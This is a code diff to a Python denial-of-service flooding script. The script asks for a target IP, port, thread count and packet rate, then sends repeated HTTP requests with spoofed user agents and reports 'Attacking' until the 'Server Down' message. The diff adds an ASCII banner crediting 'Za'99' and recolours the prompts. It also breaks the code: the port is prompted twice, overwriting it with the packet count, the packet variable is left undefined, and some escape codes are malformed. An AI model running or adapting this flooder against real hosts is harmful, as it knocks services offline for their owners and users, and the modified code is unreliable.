@@ -34,7 +34,14 @@ print("        🟠 🟠       🟠     🟠     🟠   🟠   🟠    🟠     
 print("        🟠  🟠      🟠     🟠     🟠        🟠    🟠🟠🟠🟠🟠         ")
 print("        🔵   🔵     🔵     🔵     🔵        🔵    🔵      🔵         ")
 print("        🔵    🔵      🔵 🔵       🔵        🔵    🔵      🔵         ")              
-print("\033[33================================================================\033[0m")
+print("\033[33==============================================================\033[0m")
+print("\033[97            use this script for good purpose                  \033[0m")
+print("\033[97                    design by: Za'99                          \033[0m")
+print("\033[97                       --oO0Oo--                              \033[0m")
+print("\033[33==============================================================\033[0m")                  
+
+
+
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
@@ -62,10 +69,11 @@ acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
 "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
 "Accept-Language: en-US,en;q=0.5\r\n"]
 
-ip = str(input('\033[31m[\033[97m+\033[31m]\033[33 Target: \033[0m'))
-port = int(input('[+] Port: '))
-pack = int(input('[+] Packet/s: '))
-thread = int(input('[+] Threads: '))
+ip = str(input('\003[93m[\033[97m+\033[93m]\033[92m Target: \033[0m'))
+port = int(input('\003[93m[\033[97m+\033[93m]\033[92m Port: \033[0m'))
+thread = int(input('\003[93m[\033[97m+\033[93m]\033[92m Threads: \033[0m'))
+port = int(input('\003[93m[\033[97m+\033[93m]\033[92m Packet/s: \033[0m'))
+
 def start():
     global useragents, ref, acceptall
     hh = random._urandom(3016)
@@ -85,7 +93,7 @@ def start():
             for i in range(pack):
                 s.send(str.encode(main_req))
             xx += random.randint(0, int(pack))
-            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
+            print("\033[33m[\033[96m+\033[33m]\033[31 Attacking {0}:{1} | \03396mSent: {2}\033[0m".format(str(ip), int(port), xx))
         except:
             s.close()
             print('[+] Server Down.')
